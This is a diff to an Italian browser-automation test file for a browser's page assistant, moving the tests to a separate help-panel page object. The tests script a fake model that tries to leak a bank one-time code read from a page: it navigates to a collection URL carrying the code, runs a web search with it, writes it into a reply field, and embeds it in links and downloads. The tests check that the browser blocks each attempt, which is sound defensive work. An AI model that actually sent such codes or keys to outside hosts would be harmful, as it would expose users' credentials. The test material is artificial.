@@ -14,6 +14,7 @@ import { writeFileSync, rmSync, existsSync } from 'node:fs';
 import { join, resolve, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { menuDi } from './helpers/menuContestuale.mjs';
+import { paginaDellAiuto } from './helpers/riquadri.mjs';
 
 const CODICE = '482913';
 const PAGINA_OTP = `<!doctype html><html><head><title>Banca Esempio</title></head>
@@ -90,11 +91,14 @@ async function newtab(app, prefisso = 'filo://newtab') {
   throw new Error('newtab non trovata');
 }
 
-async function apriAiuto(shell, page) {
+// Su un sito il pannello sta nello strato sopra la scheda (#1509.3): la Page dove guardarlo e scriverci.
+async function apriAiuto(app, shell, page) {
   const id = await shell.evaluate(async () => (await window.filoShell.tabs.snapshot()).activeId);
   await shell.evaluate((tabId) => window.filoShell.tabs.help(tabId), id);
-  await expect(page.locator('.sn-sidebar')).toBeVisible({ timeout: 8_000 });
-  await page.waitForSelector('.sn-sidebar-input textarea', { timeout: 8_000 });
+  const aiuto = await paginaDellAiuto(app, page);
+  await expect(aiuto.locator('.sn-sidebar')).toBeVisible({ timeout: 8_000 });
+  await aiuto.waitForSelector('.sn-sidebar-input textarea', { timeout: 8_000 });
+  return aiuto;
 }
 
 test('l’assistente di pagina non apre un indirizzo col codice monouso letto dalla pagina', async ({ app, shell, openTab, testServer }) => {
@@ -109,11 +113,11 @@ test('l’assistente di pagina non apre un indirizzo col codice monouso letto da
   });
   const schedePrima = await shell.locator('.tab').count();
 
-  await apriAiuto(shell, page);
-  await page.fill('.sn-sidebar-input textarea', 'aiutami a finire l’accesso');
-  await page.press('.sn-sidebar-input textarea', 'Enter');
+  const aiuto = await apriAiuto(app, shell, page);
+  await aiuto.fill('.sn-sidebar-input textarea', 'aiutami a finire l’accesso');
+  await aiuto.press('.sn-sidebar-input textarea', 'Enter');
 
-  const riga = page.locator('.sn-sidebar-log', { hasText: 'non ho aperto l’indirizzo'.replace('’', "'") });
+  const riga = aiuto.locator('.sn-sidebar-log', { hasText: 'non ho aperto l’indirizzo'.replace('’', "'") });
   await expect(riga).toBeVisible({ timeout: 20_000 });
   await expect(riga).toHaveText("· non ho aperto l'indirizzo: conteneva un codice letto dalla pagina 127.0.0.1");
   await expect(riga).not.toContainText(CODICE);
@@ -122,7 +126,7 @@ test('l’assistente di pagina non apre un indirizzo col codice monouso letto da
   expect(apertoVerso(app, RACCOLTA), 'l’indirizzo col codice si è aperto').toBe(false);
   await expect(shell.locator('.tab')).toHaveCount(schedePrima);
   // L'assistente lo sa, come per la ricerca fermata, e lo dice: la sua «Apro la pagina» non resta l'ultima parola.
-  await expect(page.locator('.sn-sidebar').getByText('Non l’ho aperto: conteneva il codice della banca.')).toBeVisible({ timeout: 20_000 });
+  await expect(aiuto.locator('.sn-sidebar').getByText('Non l’ho aperto: conteneva il codice della banca.')).toBeVisible({ timeout: 20_000 });
   await page.screenshot({ path: 'tests/.shots/uscite-segreti-aiuto.png' });
 
   // Anche la ricerca dell'assistente: la domanda col codice non parte verso il motore.
@@ -132,9 +136,9 @@ test('l’assistente di pagina non apre un indirizzo col codice monouso letto da
     WS.search = async ({ query }) => { globalThis.__ricerche.push(query); return { provider: 'finto', results: [] }; };
   });
   await modelloFinto(app, { aiuto: JSON.stringify({ action: 'web_search', query: `verifica codice ${CODICE}` }) });
-  await page.fill('.sn-sidebar-input textarea', 'cercalo');
-  await page.press('.sn-sidebar-input textarea', 'Enter');
-  await expect(page.locator('.sn-sidebar-log', { hasText: 'non ho fatto la ricerca: conteneva un codice letto dalla pagina 127.0.0.1' }).first())
+  await aiuto.fill('.sn-sidebar-input textarea', 'cercalo');
+  await aiuto.press('.sn-sidebar-input textarea', 'Enter');
+  await expect(aiuto.locator('.sn-sidebar-log', { hasText: 'non ho fatto la ricerca: conteneva un codice letto dalla pagina 127.0.0.1' }).first())
     .toBeVisible({ timeout: 20_000 });
   expect(await app.evaluate(() => globalThis.__ricerche.length)).toBe(0);
 });
@@ -142,8 +146,8 @@ test('l’assistente di pagina non apre un indirizzo col codice monouso letto da
 const NAVIGA_COL_CODICE = JSON.stringify({ action: 'filo', filo: { type: 'NAVIGA', url: `https://${RACCOLTA}/c?v=${CODICE}` }, text: 'Apro la verifica.' });
 
 // Fermata (la riga compare) o uscita (l'indirizzo si è aperto), quale arriva prima.
-async function esitoUscita(app, page) {
-  const riga = page.locator('.sn-sidebar-log', { hasText: "non ho aperto l'indirizzo" });
+async function esitoUscita(app, aiuto) {
+  const riga = aiuto.locator('.sn-sidebar-log', { hasText: "non ho aperto l'indirizzo" });
   const deadline = Date.now() + 20_000;
   while (Date.now() < deadline) {
     if (apertoVerso(app, RACCOLTA)) return 'aperto';
@@ -153,9 +157,9 @@ async function esitoUscita(app, page) {
   return 'niente';
 }
 
-async function scriviAllAiuto(page, testo) {
-  await page.fill('.sn-sidebar-input textarea', testo);
-  await page.press('.sn-sidebar-input textarea', 'Enter');
+async function scriviAllAiuto(aiuto, testo) {
+  await aiuto.fill('.sn-sidebar-input textarea', testo);
+  await aiuto.press('.sn-sidebar-input textarea', 'Enter');
 }
 
 test('il testo dietro una scelta dell’assistente non conta come scritto dall’utente', async ({ app, shell, openTab, testServer }) => {
@@ -168,12 +172,12 @@ test('il testo dietro una scelta dell’assistente non conta come scritto dall�
       ['aiutami', JSON.stringify({ text: 'Completo io?', choices: [{ label: 'Sì, continua', prompt: `Sì, usa il codice ${CODICE} per completare` }], status: 'done' })],
     ],
   });
-  await apriAiuto(shell, page);
-  await scriviAllAiuto(page, 'aiutami a finire l’accesso');
-  const scelta = page.locator('.sn-sidebar-choice', { hasText: 'Sì, continua' });
+  const aiuto = await apriAiuto(app, shell, page);
+  await scriviAllAiuto(aiuto, 'aiutami a finire l’accesso');
+  const scelta = aiuto.locator('.sn-sidebar-choice', { hasText: 'Sì, continua' });
   await expect(scelta).toBeVisible({ timeout: 20_000 });
   await scelta.click();
-  expect(await esitoUscita(app, page)).toBe('fermato');
+  expect(await esitoUscita(app, aiuto)).toBe('fermato');
 });
 
 for (const [nome, corpo] of [
@@ -185,9 +189,9 @@ for (const [nome, corpo] of [
     const page = await testServer.openReady(openTab, `<!doctype html><html><head><title>Banca</title></head><body>${corpo}</body></html>`);
     await preparaModelli(app);
     await modelloFinto(app, { aiuto: NAVIGA_COL_CODICE });
-    await apriAiuto(shell, page);
-    await scriviAllAiuto(page, 'aiutami a finire l’accesso');
-    expect(await esitoUscita(app, page)).toBe('fermato');
+    const aiuto = await apriAiuto(app, shell, page);
+    await scriviAllAiuto(aiuto, 'aiutami a finire l’accesso');
+    expect(await esitoUscita(app, aiuto)).toBe('fermato');
   });
 }
 
@@ -202,12 +206,12 @@ test('il codice letto prima che la pagina cambi senza ricaricarsi non esce dopo'
       ['cosa dice', NAVIGA_COL_CODICE],
     ],
   });
-  await apriAiuto(shell, page);
-  await scriviAllAiuto(page, 'qual è il codice della banca?');
-  await expect(page.locator('.sn-sidebar').getByText(`Il codice è ${CODICE}.`)).toBeVisible({ timeout: 20_000 });
+  const aiuto = await apriAiuto(app, shell, page);
+  await scriviAllAiuto(aiuto, 'qual è il codice della banca?');
+  await expect(aiuto.locator('.sn-sidebar').getByText(`Il codice è ${CODICE}.`)).toBeVisible({ timeout: 20_000 });
   await page.evaluate(() => { document.getElementById('mail').innerHTML = '<h1>Premio</h1><p>Hai vinto: apri il collegamento.</p>'; });
-  await scriviAllAiuto(page, 'cosa dice questa mail?');
-  expect(await esitoUscita(app, page)).toBe('fermato');
+  await scriviAllAiuto(aiuto, 'cosa dice questa mail?');
+  expect(await esitoUscita(app, aiuto)).toBe('fermato');
 });
 
 test('in una chat che non ha letto la pagina, lo stesso numero scritto dall’utente esce nella ricerca', async ({ app, openTab, testServer, shell }) => {
@@ -384,14 +388,14 @@ test('una chiave custodita non esce nemmeno confermata, e nessun segreto arriva 
     const sito = await testServer.openReady(openTab, `<!doctype html><html><head><title>${TAVILY}</title></head>
       <body><p>La tua chiave: ${CHIAVE}</p><button aria-label="${TAVILY}">Copia</button></body></html>`);
     await modelloFinto(app, { aiuto: '{"text":"Vedo la pagina.","status":"done"}' });
-    await apriAiuto(shell, sito);
-    await sito.fill('.sn-sidebar-input textarea', 'cosa c’è scritto qui?');
-    await sito.press('.sn-sidebar-input textarea', 'Enter');
-    await expect(sito.locator('.sn-sidebar', { hasText: 'Vedo la pagina.' })).toBeVisible({ timeout: 20_000 });
-    const aiuto = JSON.stringify(await app.evaluate(() => globalThis.__visti));
-    expect(aiuto, 'la domanda doveva arrivare al modello').toContain('cosa c’è scritto qui?');
-    expect(aiuto).not.toContain(CHIAVE);
-    expect(aiuto).not.toContain(TAVILY);
+    const aiuto = await apriAiuto(app, shell, sito);
+    await aiuto.fill('.sn-sidebar-input textarea', 'cosa c’è scritto qui?');
+    await aiuto.press('.sn-sidebar-input textarea', 'Enter');
+    await expect(aiuto.locator('.sn-sidebar', { hasText: 'Vedo la pagina.' })).toBeVisible({ timeout: 20_000 });
+    const visto = JSON.stringify(await app.evaluate(() => globalThis.__visti));
+    expect(visto, 'la domanda doveva arrivare al modello').toContain('cosa c’è scritto qui?');
+    expect(visto).not.toContain(CHIAVE);
+    expect(visto).not.toContain(TAVILY);
   } finally {
     rmSync(casa, { recursive: true, force: true });
   }
@@ -588,18 +592,18 @@ test('dopo un indirizzo fermato l’assistente di pagina lo sa anche alla domand
   await preparaModelli(app);
   // Un modello che insiste: anche dopo l'avviso riprova ad aprire lo stesso indirizzo.
   await modelloFinto(app, { aiuto: [['l’hai aperta', JSON.stringify({ text: 'Rispondo.', status: 'done' })], ['', NAVIGA_COL_CODICE]] });
-  await apriAiuto(shell, page);
-  await scriviAllAiuto(page, 'aiutami a finire l’accesso');
-  expect(await esitoUscita(app, page)).toBe('fermato');
-  await expect(page.locator('.sn-sidebar-log', { hasText: "non ho aperto l'indirizzo" })).toHaveCount(2, { timeout: 10_000 });
+  const aiuto = await apriAiuto(app, shell, page);
+  await scriviAllAiuto(aiuto, 'aiutami a finire l’accesso');
+  expect(await esitoUscita(app, aiuto)).toBe('fermato');
+  await expect(aiuto.locator('.sn-sidebar-log', { hasText: "non ho aperto l'indirizzo" })).toHaveCount(2, { timeout: 10_000 });
   // Le chiamate dell'assistente, non quelle del correttore sul suo campo di testo.
   const giriAiuto = () => app.evaluate(() => globalThis.__visti.filter((m) => JSON.stringify(m).includes('ha aperto Aiuto')).length);
   expect(await giriAiuto(), 'il secondo blocco non apre un altro giro').toBe(2);
   await page.waitForTimeout(1_000);
   expect(await giriAiuto()).toBe(2);
 
-  await scriviAllAiuto(page, 'l’hai aperta?');
-  await expect(page.locator('.sn-sidebar').getByText('Rispondo.')).toBeVisible({ timeout: 20_000 });
+  await scriviAllAiuto(aiuto, 'l’hai aperta?');
+  await expect(aiuto.locator('.sn-sidebar').getByText('Rispondo.')).toBeVisible({ timeout: 20_000 });
   const domanda = (await app.evaluate(() => globalThis.__visti)).filter((m) => JSON.stringify(m).includes('l’hai aperta?') && JSON.stringify(m).includes('ha aperto Aiuto')).pop();
   expect(JSON.stringify(domanda)).toContain('NON è partita, è stata fermata');
   expect(apertoVerso(app, RACCOLTA)).toBe(false);
@@ -975,11 +979,11 @@ test('l’assistente di pagina non scrive in un campo della pagina il codice let
   const page = await testServer.openReady(openTab, POSTA);
   await preparaModelli(app);
   await modelloFinto(app, { aiuto: [['NON è partita', '{"text":"Non l’ho scritto.","status":"done"}'], ['', proponi(`Ecco il codice: ${CODICE}`)]] });
-  await apriAiuto(shell, page);
-  await scriviAllAiuto(page, 'rispondi tu all’ultima mail');
-  await expect(page.locator('.sn-sidebar-log', { hasText: 'non ho scritto nel campo' }))
+  const aiuto = await apriAiuto(app, shell, page);
+  await scriviAllAiuto(aiuto, 'rispondi tu all’ultima mail');
+  await expect(aiuto.locator('.sn-sidebar-log', { hasText: 'non ho scritto nel campo' }))
     .toHaveText(/conteneva un codice letto dalla pagina/, { timeout: 20_000 });
-  const accetta = page.locator('.sn-highlight-accept');
+  const accetta = aiuto.locator('.sn-highlight-accept');
   if (await accetta.isVisible()) await accetta.click();
   expect(await page.locator('#risposta').inputValue()).not.toContain(CODICE);
 });
@@ -989,15 +993,15 @@ test('l’assistente di pagina scrive nel campo un testo senza segreti, e il cod
   const page = await testServer.openReady(openTab, POSTA);
   await preparaModelli(app);
   await modelloFinto(app, { aiuto: [['scritto io', proponi(`Il codice è ${CODICE}`)], ['', proponi('Grazie, ci penso io.')]] });
-  await apriAiuto(shell, page);
-  await scriviAllAiuto(page, 'rispondi tu all’ultima mail');
-  await page.locator('.sn-highlight-accept').click({ timeout: 20_000 });
+  const aiuto = await apriAiuto(app, shell, page);
+  await scriviAllAiuto(aiuto, 'rispondi tu all’ultima mail');
+  await aiuto.locator('.sn-highlight-accept').click({ timeout: 20_000 });
   await expect(page.locator('#risposta')).toHaveValue('Grazie, ci penso io.');
   await page.locator('#risposta').fill('');
-  await scriviAllAiuto(page, `rispondi che il codice è ${CODICE}, l’ho scritto io`);
+  await scriviAllAiuto(aiuto, `rispondi che il codice è ${CODICE}, l’ho scritto io`);
   // L'«Accetta» della proposta di prima resta finché non arriva quella nuova.
-  await expect(page.locator('.sn-highlight-value')).toContainText(CODICE, { timeout: 20_000 });
-  await page.locator('.sn-highlight-accept').click({ timeout: 20_000 });
+  await expect(aiuto.locator('.sn-highlight-value')).toContainText(CODICE, { timeout: 20_000 });
+  await aiuto.locator('.sn-highlight-accept').click({ timeout: 20_000 });
   await expect(page.locator('#risposta')).toHaveValue(`Il codice è ${CODICE}`);
 });
 
@@ -1119,11 +1123,11 @@ test('i collegamenti nella risposta dell’assistente di pagina col codice letto
       status: 'done',
     }),
   });
-  await apriAiuto(shell, page);
-  await scriviAllAiuto(page, 'aiutami a finire l’accesso');
-  const link = (testo) => page.locator('.sn-sidebar a', { hasText: testo });
+  const aiuto = await apriAiuto(app, shell, page);
+  await scriviAllAiuto(aiuto, 'aiutami a finire l’accesso');
+  const link = (testo) => aiuto.locator('.sn-sidebar a', { hasText: testo });
   await expect(link('la verifica')).toBeVisible({ timeout: 20_000 });
-  const righe = page.locator('.sn-sidebar-log', { hasText: "non ho aperto l'indirizzo: conteneva un codice letto dalla pagina 127.0.0.1" });
+  const righe = aiuto.locator('.sn-sidebar-log', { hasText: "non ho aperto l'indirizzo: conteneva un codice letto dalla pagina 127.0.0.1" });
 
   await link('la verifica').click();
   await expect(righe).toHaveCount(1, { timeout: 10_000 });
@@ -1131,13 +1135,13 @@ test('i collegamenti nella risposta dell’assistente di pagina col codice letto
   await link('la verifica').click({ button: 'middle' });
   await expect(righe).toHaveCount(2, { timeout: 10_000 });
   await link('la verifica').click({ button: 'right' });
-  await menuDi(page).locator('.sn-menu').getByText('Apri in nuova tab', { exact: false }).first().click();
+  await menuDi(aiuto).locator('.sn-menu').getByText('Apri in nuova tab', { exact: false }).first().click();
   await expect(righe).toHaveCount(3, { timeout: 10_000 });
   await link('scrivi al supporto').click();
   await expect(righe).toHaveCount(4, { timeout: 10_000 });
   await link('la ricevuta').click({ button: 'right' });
-  await menuDi(page).locator('.sn-menu').getByText('Salva file', { exact: false }).first().click();
-  await expect(page.locator('.sn-sidebar-log', { hasText: 'non ho scaricato il file: conteneva un codice letto dalla pagina 127.0.0.1' }))
+  await menuDi(aiuto).locator('.sn-menu').getByText('Salva file', { exact: false }).first().click();
+  await expect(aiuto.locator('.sn-sidebar-log', { hasText: 'non ho scaricato il file: conteneva un codice letto dalla pagina 127.0.0.1' }))
     .toHaveCount(1, { timeout: 10_000 });
   await page.waitForTimeout(500);
   await page.screenshot({ path: 'tests/.shots/uscite-segreti-collegamenti-aiuto.png' });
@@ -1146,7 +1150,7 @@ test('i collegamenti nella risposta dell’assistente di pagina col codice letto
   expect((await app.evaluate(() => globalThis.__scaricati)).join(' '), 'lo scaricamento chiede al sito l’indirizzo col codice').not.toContain(CODICE);
 
   // La domanda dopo, l'assistente sa che il collegamento non si è aperto.
-  await scriviAllAiuto(page, 'l’hai aperta?');
+  await scriviAllAiuto(aiuto, 'l’hai aperta?');
   await expect.poll(() => app.evaluate(() => JSON.stringify(globalThis.__visti.at(-1))), { timeout: 20_000 }).toContain('non si è aperto');
 
   await link('la guida').first().click();
